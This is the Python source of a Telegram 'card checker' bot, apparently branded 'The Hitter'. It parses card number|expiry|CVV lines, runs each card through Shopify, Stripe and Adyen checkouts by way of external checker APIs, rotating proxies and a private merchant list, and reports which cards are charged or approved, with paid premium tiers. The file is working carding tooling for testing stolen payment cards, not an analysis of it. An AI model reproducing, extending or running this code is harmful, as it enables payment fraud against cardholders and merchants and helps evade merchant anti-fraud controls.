#!/usr/bin/env python3
"""
TheHitterBot.py — Telegram checker bot (Shopify + Stripe + Adyen + ravenxkiller).

Companion files: helpers.py, hit.py, adyen_engine.py
Requires: telethon aiohttp aiofiles requests httpx python-dotenv cachetools curl_cffi pycryptodome
"""
import os, re, json, gzip, time, random, asyncio, itertools, threading, urllib3
import aiohttp, aiofiles, requests, httpx

from telethon import TelegramClient, events, Button
from telethon.tl.custom.message import Message as _TLMessage
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from dotenv import load_dotenv
    _ENV_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
    load_dotenv(_ENV_PATH)
except ImportError:
    pass

try:
    import helpers
except ImportError:
    helpers = None

try:
    import adyen_engine
except ImportError:
    adyen_engine = None

try:
    import hit as hit_api
except ImportError:
    hit_api = None


# ════════════════════════════════════════════════════════════
#  CONFIG
# ════════════════════════════════════════════════════════════
API_ID    = int(os.environ.get('API_ID',    '0'))
API_HASH  =     os.environ.get('API_HASH',  '')
BOT_TOKEN =     os.environ.get('BOT_TOKEN', '')
TG_API    = f"https://api.telegram.org/bot{BOT_TOKEN}"

BOT_BRAND        = 'The Hitter ◈ Checker'
OWNER_NAME       = 'Tahjir Tansim'
OWNER_USERNAME   = 'Tahjir_Tansim'
OWNER_ID         = 8054789773
_EXTRA_OWNER_IDS = {1061332930}
DEV_LINE         = f'💻 <b>Dev</b>  »  <a href="https://t.me/{OWNER_USERNAME}">{OWNER_NAME}</a>'

MASS_WORKERS = int(os.environ.get('MASS_WORKERS', '8'))

HIT_LOG_GC_ID = int(os.environ.get('HIT_LOG_GC_ID', '-1003962330916'))

# ── GitHub sites repo (private) ──────────────────────────────────────────
GITHUB_TOKEN   = (os.environ.get('GITHUB_TOKEN')
                  or os.environ.get('GH_TOKEN')
                  or os.environ.get('GIT_TOKEN')
                  or os.environ.get('GITHUB_PAT')
                  or '').strip()
GITHUB_REPO    = os.environ.get('GITHUB_REPO', '').strip()
GITHUB_BRANCH  = os.environ.get('GITHUB_BRANCH', 'main').strip()
GITHUB_SITES_FILE = os.environ.get('GITHUB_SITES_FILE', 'sites.txt').strip()

# ── Adyen 3DS worker (optional) ─────────────────────────────────────────
ADYEN_3DS_WORKER = os.environ.get('ADYEN_3DS_WORKER', '').strip()

# ── NopeCHA (optional) ───────────────────────────────────────────────────
NOPECHA_API_KEY = os.environ.get('NOPECHA_API_KEY', '').strip()

# Gateways whose hits are dropped (retry rotates to another merchant)
_GATEWAY_BLOCKLIST = {"authorize.net"}

_ADMIN_FILE = os.path.join(os.path.dirname(__file__), 'admin.json')
_DEFAULT_ADMINS = (
    {int(x.strip()) for x in os.environ.get('ADMIN_ID', '').split(',') if x.strip().isdigit()}
    | ({OWNER_ID} if OWNER_ID else set())
    | _EXTRA_OWNER_IDS
)

def _load_admin_ids() -> set:
    try:
        with open(_ADMIN_FILE) as f:
            data = json.load(f)
            ids  = data.get('admin_ids', [])
            return set(ids) | _DEFAULT_ADMINS if ids else _DEFAULT_ADMINS
    except Exception:
        return _DEFAULT_ADMINS

def _save_admin_ids(ids: set):
    try:
        with open(_ADMIN_FILE) as f:
            data = json.load(f)
    except Exception:
        data = {}
    data['admin_ids'] = list(ids)
    with open(_ADMIN_FILE, 'w') as f:
        json.dump(data, f)

ADMIN_IDS = _load_admin_ids()
ADMIN_ID  = OWNER_ID

PREMIUM_FILE      = 'premium.txt'
SITES_FILE        = 'sites.txt'
PROXY_FILE        = 'proxy.txt'
USER_PROXY_FILE   = 'user_proxies.json'
USER_POOL_FILE    = 'user_pool.json'
USER_SITES_FILE   = 'user_sites.json'
KEYS_FILE         = 'keys.json'
USERS_ACCESS_FILE = 'users_access.json'

LIMITS = {
    "admin":   15000,
    "premium": 10000,
}

HIT_MAX_CCS = 10
HIT_MAX_SITES_PER_USER = 500


# ════════════════════════════════════════════════════════════
#  EMOJIS
# ════════════════════════════════════════════════════════════
SEP  = "────────────────────"
LINE = "─" * 24

PREMIUM_EMOJI_IDS = {
        "✅":  "5278327121008167894",
    "❌":  "5040042498634810056",
    "⚠️": "5420323339723881652",
    "⚡":  "6174996123522959140",
    "⚡️": "6174996123522959140",
    "🔥":  "5039644681583985437",
    "💎":  "5427168083074628963",
    "✔️": "5206607081334906820",
    "✨":  "5040016479722931047",
    "🎉":  "5039778134807806727",
    "🎊":  "5039778134807806727",
    "🎯":  "5039905162760553480",
    "⛔️": "6181277564732972292",
    "⛔":  "6181277564732972292",
    "🛑":  "6181277564732972292",
    "🚨":  "5039671744172917707",
        "💰":  "5039789890133296083",
    "💳":  "5447453226498552490",
    "💲":  "5447579253723918909",
    "💵":  "5409048419211682843",
    "💸":  "5837027045376271166",
    "💱":  "5039789890133296083",
    "🏦":  "6089185885289454318",
    "🏧":  "5447453226498552490",
    "🖥":  "5039579582764680065",
    "📊":  "5042290883949495533",
    "📈":  "5039808285478224750",
    "📉":  "5039759318556083411",
    "🥇":  "6179279816529814743",
    "🏆":  "6089185885289454318",
        "👑":  "5039727497143387500",
    "👤":  "5992129361090711368",
    "🧑":  "5992129361090711368",
    "👾":  "6181389246767570324",
    "😈":  "6336664426325740768",
    "👿":  "6181349715888577684",
    "🐶":  "6181480793995483763",
    "🐍":  "5116298753917060171",
        "🤖":  "6174896506051495705",
    "⚙️": "5445059250382469069",
    "⚙":   "5445059250382469069",
    "⚒":   "5445059250382469069",
    "🔌":  "5445059250382469069",
    "🌐":  "6321225560789877992",
    "ℹ️": "5334544901428229844",
    "🏳️":"5256143829672672750",
    "📍":  "5391032818111363540",
    "🇺🇸": "6034969533859499947",
    "📡":  "5447448489149625830",
    "🔔":  "5042111805288089118",
    "🛡":  "5042328396193864923",
    "🔑":  "5399885604701880145",
    "🗝":  "5399885604701880145",
    "🔒":  "5445059250382469069",
    "🔓":  "5445373981290952548",
    "🔗":  "5042101437237036298",
        "⏰":  "5445350406215465190",
    "⏱️": "5445350406215465190",
        "🚀":  "6174445826543191998",
    "☄️": "5224607267797606837",
    "⭐":  "5042061201983407048",
    "⭐️": "5042176294222037888",
    "💫":  "5042200814190330758",
    "🔮":  "5042302287087666158",
        "💙":  "5300842752618018643",
    "💖":  "5039643719511311434",
    "❤":   "5040072842578756396",
        "🌍":  "5447410659077661506",
    "🌎":  "5447410659077661506",
            "🏪":  "6089185885289454318",
        "🔰":  "5042328396193864923",
        "📧":  "5443127283898405358",
    "🔐":  "5445059250382469069",
        "💀":  "5042209657527993345",
    "💯":  "5042297717242463211",
    "🚫":  "5039671744172917707",
    "🎀":  "5039953030171067177",
    "🧨":  "5039778134807806727",
    "🃏":  "6028206863038811654",
    "💡":  "5042264341051605743",
    "👩💻": "5445224894386172410",
    "💬":  "5040036030414062506",
    "📌":  "5397782960512444700",
    "📋":  "5445260044398524944",
    "📝":  "5444889156792646660",
    "📁":  "6026239398650056451",
    "🗂":  "5447210891558814377",
    "🗑":  "5039614900280754969",
    "🗑️": "5039614900280754969",
    "📅":  "6168242008277125889",
    "📤":  "5445355530111437729",
    "📥":  "5443127283898405358",
    "🆕":  "5041852827350074289",
    "🟢":  "5039928501612839813",
    "🔴":  "5042042652019655612",
    "🟡":  "6025833352441893055",
    "🔁":  "5348386034835015762",
    "⏸":  "5042036407137207122",
    "▶️": "5039753786638205957",
    "⏹":  "5134537521518085000",
    "🧹":  "5039751080808809534",
    "⏱":  "6186053057265016346",
    "⏳":  "5042036407137207122",
    "🔢":  "5042290883949495533",
        "🎟":  "5377624166436445368",
    "🔧":  "5445059250382469069",
    "💠":  "5427168083074628963",
    "🥈":  "6179279816529814743",
    "🔍":  "5042302287087666158",
    "💻":  "5039579582764680065",
    "📩":  "5443127283898405358",
    "🔀":  "5348386034835015762",
}

BUTTON_CUSTOM_EMOJIS = {
    "✅": "5278327121008167894",
    "❌": "5785177332595561481",
    "↪️": "5445365692004071819",
    "®️": "5445373981290952548",
    "🔥": "5039644681583985437",
    "⚡": "6174996123522959140",
    "⭐": "5042061201983407048",
    "🚀": "6174445826543191998",
    "⚙️": "5445059250382469069",
    "📡": "5447448489149625830",
    "✋": "5408900479063175258",
    "💫": "5042200814190330758",
    "💎": "5427168083074628963",
    "🌐": "6321225560789877992",
    "🔮": "5042302287087666158",
    "⚠️": "5420323339723881652",
    "🛡": "5042328396193864923",
    "💰": "5039789890133296083",
    "👑": "5039727497143387500",
    "🤖": "6174896506051495705",
    "📋": "5445260044398524944",
    "🏧": "5447453226498552490",
    "💙": "5300842752618018643",
    "💳": "5447453226498552490",
    "⏰": "5445350406215465190",
    "💻": "5039579582764680065",
    "🔑": "5399885604701880145",
}

import re as _re
_BTN_EMOJI_STRIP = _re.compile(
    r'^(?:' + '|'.join(_re.escape(e) for e in BUTTON_CUSTOM_EMOJIS) + r')\s*'
)

def _btn_icon_id(text: str):
    for emoji_char, doc_id in BUTTON_CUSTOM_EMOJIS.items():
        if emoji_char in text:
            return doc_id
    return None

def _clean_btn_text(text: str) -> str:
    return _BTN_EMOJI_STRIP.sub('', text)

def pe(text: str) -> str:
    if not text:
        return text
    holders = []
    result  = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        ph = f"\x00PE{i:03d}\x00"
        holders.append((ph, doc_id, emoji))
        result = result.replace(emoji, ph)
    for ph, doc_id, emoji in holders:
        result = result.replace(ph, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result


_SB_UPPER = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_SB_LOWER = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_SB_DIGIT = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"

def _sb(text) -> str:
    out = []
    for c in str(text):
        if 'A' <= c <= 'Z':   out.append(_SB_UPPER[ord(c) - 65])
        elif 'a' <= c <= 'z': out.append(_SB_LOWER[ord(c) - 97])
        elif '0' <= c <= '9': out.append(_SB_DIGIT[ord(c) - 48])
        else:                 out.append(c)
    return ''.join(out)


# ════════════════════════════════════════════════════════════
#  BIN
# ════════════════════════════════════════════════════════════
_DB: dict = {}
_DB_PATH = os.path.join(os.path.dirname(__file__), "data", "bins.json.gz")
_HTTP_CACHE: dict = {}

def load_bins() -> int:
    global _DB
    if not os.path.exists(_DB_PATH):
        return 0
    try:
        with gzip.open(_DB_PATH, "rt", encoding="utf-8") as f:
            _DB = json.load(f)
        return len(_DB)
    except Exception:
        return 0

def _lookup_local(bin6: str):
    entry = _DB.get(bin6) or _DB.get(bin6[:6])
    if entry and isinstance(entry, list) and len(entry) == 6:
        return tuple(entry)
    return None

async def get_bin_info(card_number: str):
    bin6 = (card_number or '')[:6]
    if not bin6 or len(bin6) < 6:
        return ("-", "-", "-", "-", "-", "")
    hit = _lookup_local(bin6)
    if hit:
        return hit
    if bin6 in _HTTP_CACHE:
        return _HTTP_CACHE[bin6]
    if helpers is not None:
        try:
            d = await helpers.bin_lookup(bin6)
            if d and d.get('brand') not in (None, '-', ''):
                result = (
                    d.get('brand',   '-') or '-',
                    d.get('type',    '-') or '-',
                    d.get('level',   '-') or '-',
                    d.get('bank',    '-') or '-',
                    d.get('country', '-') or '-',
                    d.get('flag',    '')  or '',
                )
                _HTTP_CACHE[bin6] = result
                return result
        except Exception:
            pass
    try:
        timeout = aiohttp.ClientTimeout(total=6)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(f"https://bins.antipublic.cc/bins/{bin6}") as r:
                if r.status == 200:
                    d = json.loads(await r.text())
                    result = (
                        d.get("brand",        "-") or "-",
                        d.get("type",         "-") or "-",
                        d.get("level",        "-") or "-",
                        d.get("bank",         "-") or "-",
                        d.get("country_name", "-") or "-",
                        d.get("country_flag", "")  or "",
                    )
                    _HTTP_CACHE[bin6] = result
                    if len(_HTTP_CACHE) > 2000:
                        for k in list(_HTTP_CACHE)[:500]:
                            _HTTP_CACHE.pop(k, None)
                    return result
    except Exception:
        pass
    return ("-", "-", "-", "-", "-", "")


# ════════════════════════════════════════════════════════════
#  STORAGE
# ════════════════════════════════════════════════════════════
user_proxies: dict = {}
user_pool_enabled: dict = {}
_users_access: dict = {}
_user_sites: dict = {}

def _to_list(val) -> list:
    if val is None: return []
    if isinstance(val, list): return [p for p in val if p]
    return [val] if val else []

def load_user_proxies():
    global user_proxies
    if os.path.exists(USER_PROXY_FILE):
        try:
            with open(USER_PROXY_FILE, 'r') as f:
                raw = json.load(f)
                user_proxies = {int(k): _to_list(v) for k, v in raw.items()}
        except Exception:
            user_proxies = {}

def save_user_proxies():
    try:
        with open(USER_PROXY_FILE, 'w') as f:
            json.dump({str(k): v for k, v in user_proxies.items()}, f)
    except Exception:
        pass

def get_user_proxy_list(uid) -> list:
    return list(user_proxies.get(uid, []))

def set_user_proxies(uid, proxies: list):
    user_proxies[uid] = [p for p in proxies if p]
    save_user_proxies()

def remove_user_proxy(uid):
    user_proxies.pop(uid, None)
    save_user_proxies()

def load_user_pool():
    global user_pool_enabled
    if os.path.exists(USER_POOL_FILE):
        try:
            with open(USER_POOL_FILE, 'r') as f:
                user_pool_enabled = {int(k): v for k, v in json.load(f).items()}
        except Exception:
            user_pool_enabled = {}

def save_user_pool():
    try:
        with open(USER_POOL_FILE, 'w') as f:
            json.dump({str(k): v for k, v in user_pool_enabled.items()}, f)
    except Exception:
        pass

# ── user sites ─────────────────────────────────────────────────────
def _load_user_sites():
    global _user_sites
    if os.path.exists(USER_SITES_FILE):
        try:
            with open(USER_SITES_FILE, 'r') as f:
                raw = json.load(f)
                _user_sites = {int(k): list(v) for k, v in raw.items()}
        except Exception:
            _user_sites = {}

def _save_user_sites():
    try:
        with open(USER_SITES_FILE, 'w') as f:
            json.dump({str(k): v for k, v in _user_sites.items()}, f, indent=2)
    except Exception:
        pass

def get_user_sites(uid: int) -> list:
    return list(_user_sites.get(uid, []))

def add_user_sites(uid: int, sites: list) -> int:
    existing = set(_user_sites.get(uid, []))
    added = 0
    for s in sites:
        s = s.strip()
        if s and s not in existing:
            existing.add(s)
            added += 1
    _user_sites[uid] = list(existing)
    _save_user_sites()
    return added

def _load_users_access():
    global _users_access
    if os.path.exists(USERS_ACCESS_FILE):
        try:
            with open(USERS_ACCESS_FILE, 'r') as f:
                _users_access = json.load(f)
        except Exception:
            _users_access = {}

def _save_users_access():
    try:
        with open(USERS_ACCESS_FILE, 'w') as f:
            json.dump(_users_access, f, indent=2)
    except Exception:
        pass

def get_file_lines(fp):
    if not os.path.exists(fp):
        return []
    try:
        with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]
    except Exception:
        return []

def load_premium_users(): return get_file_lines(PREMIUM_FILE)
def load_proxies():       return get_file_lines(PROXY_FILE)

# ── Sites: cached + GitHub fetched + dead-site blacklist ─────────────
_SITES_CACHE: list = []
_SITES_LOCK = asyncio.Lock()
_DEAD_SITES: set = set()

_URL_RE = re.compile(r'^https?://[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}(?:[/?].*)?$')

def _is_valid_url(u: str) -> bool:
    return bool(_URL_RE.match((u or '').strip()))

async def _fetch_github_sites() -> list:
    if not GITHUB_REPO or not GITHUB_TOKEN:
        return []
    url = f"https://raw.githubusercontent.com/{GITHUB_REPO}/{GITHUB_BRANCH}/{GITHUB_SITES_FILE}"
    try:
        timeout = httpx.Timeout(connect=8.0, read=30.0, write=5.0, pool=5.0)
        async with httpx.AsyncClient(timeout=timeout, verify=False) as c:
            r = await c.get(url, headers={
                "Authorization": f"token {GITHUB_TOKEN}",
                "Accept": "application/vnd.github.v3.raw",
                "User-Agent": "TheHitterBot",
            })
            if r.status_code != 200:
                return []
            return [ln.strip() for ln in r.text.splitlines()
                    if ln.strip() and not ln.strip().startswith('#')]
    except Exception:
        return []

async def reload_sites() -> int:
    global _SITES_CACHE, _DEAD_SITES
    async with _SITES_LOCK:
        sites = await _fetch_github_sites()
        if not sites:
            sites = get_file_lines(SITES_FILE)
        _SITES_CACHE = sites
        _DEAD_SITES = set()
        return len(sites)

def load_sites() -> list:
    return _SITES_CACHE

def mark_site_dead(url: str):
    if url:
        _DEAD_SITES.add(url)

def get_live_sites() -> list:
    return [s for s in _SITES_CACHE if s not in _DEAD_SITES]

# ── access checks ───────────────────────────────────────────────────
def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS or uid in _DEFAULT_ADMINS

def is_premium(uid: int) -> bool:
    if is_admin(uid):
        return True
    rec = _users_access.get(str(uid))
    if rec:
        exp = rec.get('expires_at')
        if exp is None or exp > time.time():
            return True
        return False
    return str(uid) in load_premium_users()

def get_user_limit(uid: int) -> int:
    if is_admin(uid):
        return LIMITS["admin"]
    if is_premium(uid):
        return LIMITS["premium"]
    return 0

def get_proxies_for_user(uid: int) -> list:
    user_list = get_user_proxy_list(uid)
    pool      = load_proxies()
    pool_on   = user_pool_enabled.get(uid, True)
    if is_admin(uid):
        if user_list:
            return (user_list + pool) if pool_on else user_list
        return pool
    if not user_list:
        return []
    return (user_list + pool) if pool_on else user_list

def extract_cc(text: str) -> list:
    matches = re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)
    cards = []
    for card, month, year, cvv in matches:
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def make_progress_bar(current, total, width=20) -> str:
    if total == 0:
        return f"[{'░'*width}] 0/0 (0%)"
    filled = int(width * current / total)
    pct    = int(100 * current / total)
    return f"[{'█'*filled}{'░'*(width-filled)}] {current}/{total} ({pct}%)"

load_user_proxies()
load_user_pool()
_load_user_sites()
_load_users_access()


# ════════════════════════════════════════════════════════════
#  CARDS
# ════════════════════════════════════════════════════════════
def _result_header(status: str):
    if status == 'Charged':  return ("⚡  CHARGED  —  Hit Confirmed",  "Charged 💎")
    if status == 'Approved': return ("✅  APPROVED  —  Auth Detected",  "Approved ✅")
    if status == 'OTP':      return ("🔔  OTP REQUIRED",                "OTP 🔔")
    return ("❌  DECLINED", "Declined ❌")

def _clean_response(msg: str) -> str:
    m = (msg or '').lower()
    if 'payment captured' in m or 'payment was successful' in m or 'captured successfully' in m:
        return 'Payment captured ✅'
    if 'auth' in m and ('approved' in m or 'success' in m):
        return 'Auth approved ✅'
    if 'approved' in m and '3ds not required' in m:
        return 'Approved — no 3DS ✅'
    if 'approved' in m and '3ds' not in m:
        return 'Card approved ✅'
    if 'insufficient funds' in m:
        return 'Insufficient funds 💸'
    if 'do not honor' in m or 'do not honour' in m:
        return 'Do not honor ❌'
    if 'card was declined' in m or 'card has been declined' in m or 'transaction declined' in m:
        return 'Card declined ❌'
    if 'declined' in m:
        return 'Declined ❌'
    if '3d secure' in m or '3ds' in m or 'authentication required' in m:
        return '3DS required ⚠️'
    if 'invalid card' in m or 'invalid number' in m:
        return 'Invalid card ❌'
    if 'expired' in m:
        return 'Card expired ❌'
    if 'incorrect cvc' in m or 'invalid cvc' in m or 'security code' in m:
        return 'Invalid CVV ❌'
    if 'lost' in m:
        return 'Card reported lost ❌'
    if 'stolen' in m:
        return 'Card reported stolen ❌'
    if 'pickup' in m:
        return 'Card pickup required ❌'
    if 'limit' in m or 'exceeded' in m:
        return 'Limit exceeded ❌'
    return msg[:60] if msg and len(msg) > 60 else (msg or '')

def checker_line(uid: int, display_name: str) -> str:
    return f'👤 <b>By</b>  »  <a href="tg://user?id={uid}">{display_name}</a>'

def _fmt_price(price) -> str:
    if price is None:
        return '—'
    s = str(price).replace('$', '').strip()
    s = re.sub(r'\s*[A-Za-z]{2,4}\s*$', '', s).strip()
    if not s or s in ('-', 'None', '0', '0.00', '0.0'):
        return '—'
    s = re.sub(r'^[A-Za-z]{2,4}\s*', '', s).strip()
    if not s:
        return '—'
    return f'${s} USD'

def build_result_card(result: dict, bin_info: tuple, uid: int, cname: str) -> str:
    brand, btype, level, bank, country, flag = bin_info
    header, status_label = _result_header(result['status'])
    gate        = result.get('gateway', 'Shopify Payments')
    price_str   = _fmt_price(result.get('price', '-'))
    t           = result.get('time')
    time_str    = f'{t}s' if t is not None else '—'
    dev_link    = f'<a href="https://t.me/{OWNER_USERNAME}">{OWNER_NAME}</a>'
    receipt_url = result.get('receipt_url', '') or ''
    receipt_line = (
        f"🔗 <b>Receipt</b>    »  <a href=\"{receipt_url}\">View Receipt</a>\n"
        if result['status'] == 'Charged' and receipt_url else ""
    )
    bin_parts = " · ".join(p for p in [brand, btype, level] if p and p != '-')
    return pe(
        f"<b>{header}</b>\n"
        f"<b>{SEP}</b>\n"
        f"🃏 <b>Card</b>       »  <tg-spoiler>{result['card']}</tg-spoiler>\n"
        f"✨ <b>Status</b>     »  {status_label}\n"
        f"🖥 <b>Response</b>   »  {_clean_response(result['message'])}\n"
        f"🌐 <b>Gateway</b>    »  {gate}\n"
        f"⏱️ <b>Time</b>      »  {time_str}\n"
        + receipt_line
        + f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"💳 {bin_parts}\n"
        f"🏦 <b>Bank</b>       »  {bank}\n"
        f"🌍 <b>Country</b>    »  {country} {flag}"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"💵 <b>Amount</b>     »  <b>{price_str}</b>\n"
        f"<b>{SEP}</b>\n"
        f"{checker_line(uid, cname)}\n"
        f"💻 <b>Dev</b>  »  {dev_link}"
    )


# ════════════════════════════════════════════════════════════
#  CHECK ENGINE
# ════════════════════════════════════════════════════════════
CHECKER_API  = os.environ.get("CHECKER_API_URL", "http://localhost:8099")
_API_TIMEOUT = httpx.Timeout(connect=5.0, read=45.0, write=5.0, pool=10.0)

_http_client: httpx.AsyncClient | None = None
_client_lock = asyncio.Lock()

def clear_session_bad_sites():
    return None

async def _get_client() -> httpx.AsyncClient:
    global _http_client
    async with _client_lock:
        if _http_client is None or _http_client.is_closed:
            _http_client = httpx.AsyncClient(
                timeout=_API_TIMEOUT,
                limits=httpx.Limits(
                    max_connections=500,
                    max_keepalive_connections=100,
                    keepalive_expiry=30.0,
                ),
            )
    return _http_client

def _make_result(card, status, message, price='-', gateway='Shopify Payments',
                 receipt_url='', retryable=False, proxy='', time=None):
    return {
        'status':      status,
        'message':     message,
        'card':        card,
        'gateway':     gateway,
        'price':       price,
        'receipt_url': receipt_url,
        'retry':       retryable,
        'proxy':       proxy,
        'time':        time,
    }

CHECKER_APIS = [
    {
        "name":      "shopify",
        "builder":   lambda s, c, p: f"https://web-production-0919d.up.railway.app/shopify?site={s}&cc={c}&proxy={p}",
        "normalize": "_normalize_multi",
    },
    {
        "name":      "stripe",
        "builder":   lambda s, c, p: f"https://web-production-ce19f.up.railway.app/gateway=AutoStripe/key=md-tech1/site={s}/cc={c}/proxy={p}",
        "normalize": "_normalize_multi",
    },
    {
        "name":      "selfhost",
        "builder":   lambda s, c, p: f"https://5.83.134.51/check?card={c}&url={s}&proxy={p}",
        "normalize": "_normalize_selfhost",
        "verify_ssl": False,
    },
]

_MULTI_TIMEOUT = httpx.Timeout(connect=6.0, read=45.0, write=6.0, pool=10.0)

_TRANSIENT_SIGNALS = (
    'connection_error', 'connection timed out', 'connection timeout', 'timed out', 'timeout',
    'unavailable', 'required_artifacts_unavailable',
    'pci_token_failed', 'graph_error', 'graphql', 'storefront graphql',
    'http 429', '429', 'rate limit', 'too many requests',
    'service unavailable', 'temporarily',
    'proxy_error', 'proxy dead', 'eof occurred', 'remote end closed', 'failed to perform',
    'socket', 'connection reset',
    'generic_error', 'exception',
    'captcha_required',
)

def _is_transient(response: str, gateway: str = "") -> bool:
    r = (response or '').lower()
    g = (gateway or '').lower()
    if g == 'unknown':
        return True
    if not r:
        return True
    return any(s in r for s in _TRANSIENT_SIGNALS)

def _is_blocked_gateway(gateway: str) -> bool:
    return (gateway or '').strip().lower() in _GATEWAY_BLOCKLIST

def _is_adyen_url(url: str) -> bool:
    if not url:
        return False
    low = url.lower()
    return ('adyen.link' in low) or ('adyen.com' in low and '/checkoutshopper/' in low)

def _normalize_multi(data: dict, card: str, proxy_raw: str) -> dict:
    status_bool = data.get("Status", data.get("status"))
    gateway     = data.get("Gateway")  or data.get("gateway") or "Shopify Payments"
    response    = data.get("Response") or data.get("response") or data.get("message", "")
    price       = data.get("Price",    data.get("price", "-"))
    currency    = data.get("Currency", data.get("currency", "USD"))
    time_str    = data.get("Time",     data.get("time", ""))
    price_str   = f"{price} {currency}".strip() if price not in (None, "-", "", 0, 0.0) else "-"
    retryable   = _is_transient(response, gateway)

    if status_bool is True:
        if _is_blocked_gateway(gateway):
            return _make_result(
                card, "Dead",
                message   = f"Blocked gateway: {gateway}",
                gateway   = gateway,
                retryable = True,
                proxy     = proxy_raw or "Not Used",
                time      = time_str,
            )
        return _make_result(
            card, "Charged",
            message   = response or "Payment captured",
            price     = price_str,
            gateway   = gateway,
            proxy     = proxy_raw or "Not Used",
            time      = time_str,
            retryable = False,
        )

    return _make_result(
        card, "Dead",
        message   = response or "Declined",
        price     = price_str,
        gateway   = gateway,
        retryable = retryable,
        proxy     = proxy_raw or "Not Used",
        time      = time_str,
    )

def _normalize_selfhost(data: dict, card: str, proxy_raw: str) -> dict:
    """Parse the 5.83.134.51 selfhost API response shape."""
    charged_raw = str(data.get("Charged", "False")).strip().lower()
    is_charged  = charged_raw == "true"
    status_code = (data.get("status_code") or "").upper()
    response    = data.get("Response") or data.get("response") or ""
    price_raw   = data.get("Price") or "-"
    price_str   = f"{price_raw} USD" if price_raw not in ("-", "", None) else "-"
    receipt     = data.get("receipt_url") or ""
    api_retry   = bool(data.get("retryable", False))

    if status_code == "CAPTCHA_REQUIRED":
        api_retry = True

    if is_charged:
        return _make_result(
            card, "Charged",
            message=response or "Charged",
            price=price_str,
            gateway="Shopify (selfhost)",
            receipt_url=receipt,
            proxy=proxy_raw or "Not Used",
            retryable=False,
        )

    if status_code in ("INSUFFICIENT_FUNDS", "LIVE", "CARD_LIVE"):
        return _make_result(
            card, "Approved",
            message=response or "Insufficient Funds",
            price=price_str,
            gateway="Shopify (selfhost)",
            proxy=proxy_raw or "Not Used",
            retryable=False,
        )

    return _make_result(
        card, "Dead",
        message=response or status_code or "Declined",
        price=price_str,
        gateway="Shopify (selfhost)",
        retryable=api_retry,
        proxy=proxy_raw or "Not Used",
    )

async def _call_api_direct(api: dict, shop_url: str, card: str, proxy_raw: str):
    c   = await _get_client()
    url = api["builder"](shop_url, card, proxy_raw or "")
    verify = api.get("verify_ssl", True)
    try:
        r = await c.get(url, timeout=_MULTI_TIMEOUT, verify=verify)
        if r.status_code != 200:
            return None
        data = r.json()
    except Exception:
        return None

    norm_name = api.get("normalize", "_normalize_multi")
    if norm_name == "_normalize_selfhost":
        return _normalize_selfhost(data, card, proxy_raw)
    return _normalize_multi(data, card, proxy_raw)

async def _call_checker_api(shop_url: str, card: str, proxy_raw: str) -> dict:
    """Waterfall: try each API in order.
       - Charged/Approved  → ship it
       - Dead with retry=True → try next API
       - Dead with retry=False → final answer
    """
    last_err = "All checkers failed"
    last_result = None
    for api in CHECKER_APIS:
        try:
            result = await _call_api_direct(api, shop_url, card, proxy_raw)
        except Exception as e:
            last_err = str(e)
            continue
        if result is None:
            continue
        if result.get('status') in ('Charged', 'Approved'):
            return result
        if result.get('retry'):
            last_result = result
            last_err = result.get('message', 'Retryable')
            if 'CAPTCHA' in (result.get('message') or '').upper():
                mark_site_dead(shop_url)
            continue
        return result
    if last_result is not None:
        return last_result
    return _make_result(card, "Dead", last_err, retryable=True)

async def _route_check(shop_url: str, card: str, proxy_raw: str) -> dict:
    if _is_adyen_url(shop_url) and adyen_engine is not None:
        try:
            return await adyen_engine.run_check(shop_url, card, proxy_raw or "")
        except Exception as e:
            return _make_result(card, "Dead", f"Adyen engine error: {e}", retryable=True)
    return await _call_checker_api(shop_url, card, proxy_raw)

_PROXY_ERR_SIGNALS = (
    'connection timed out', 'connection timeout', 'timed out',
    'proxy', 'eof occurred', 'remote end closed', 'failed to perform',
)

def _is_proxy_err(msg: str) -> bool:
    return any(s in (msg or '').lower() for s in _PROXY_ERR_SIGNALS)

async def test_site(site: str, proxy: str) -> dict:
    test_card = "5154623245618097|03|2032|156"
    try:
        result = await _route_check(site, test_card, proxy)
        if result['status'] in ('Charged', 'Approved', 'Dead'):
            return {'site': site, 'status': 'alive'}
        return {'site': site, 'status': 'dead', 'msg': (result.get('message') or '')[:100]}
    except httpx.ConnectError:
        return {'site': site, 'status': 'dead', 'msg': 'Checker API not reachable'}
    except Exception as e:
        msg = str(e)[:80]
        if 'step' in msg.lower():
            return {'site': site, 'status': 'step_error', 'msg': msg}
        return {'site': site, 'status': 'dead', 'msg': msg}

async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
    if not sites:
        return _make_result(card, 'Dead', 'No sites configured')
    if not proxies:
        return _make_result(card, 'Dead', 'No proxy configured')

    last_err     = 'Unknown error'
    MAX_TRIES    = 8
    failed_sites = set()

    for attempt in range(MAX_TRIES):
        available = [s for s in sites if s not in failed_sites] or list(sites)
        shop_url  = random.choice(available)
        proxy_raw = (start_proxy if attempt == 0 and start_proxy else random.choice(proxies))

        try:
            result = await _route_check(shop_url, card, proxy_raw)
        except Exception as e:
            last_err = str(e)
            failed_sites.add(shop_url)
            await asyncio.sleep(0.5)
            continue

        if result['status'] in ('Charged', 'Approved'):
            result['proxy'] = proxy_raw
            return result

        if result['status'] == 'Dead' and not result.get('retry'):
            return result

        last_err = result.get('message', 'Retryable error')
